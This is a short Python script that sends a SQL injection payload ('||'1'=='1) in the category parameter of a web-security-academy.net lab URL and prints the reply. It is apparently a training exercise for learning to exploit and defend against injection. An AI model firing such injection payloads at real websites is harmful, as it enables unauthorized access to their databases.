import requests

DOMAIN = "0a5200d60450e53382c5ecdf00990035.web-security-academy.net"

def injection(payload="Corporate+gifts"):
    url = f"https://{DOMAIN}/filter?category={payload}"
    response = requests.get(url)
    print(response.text)

injection("Corporate+gifts'||'1'=='1")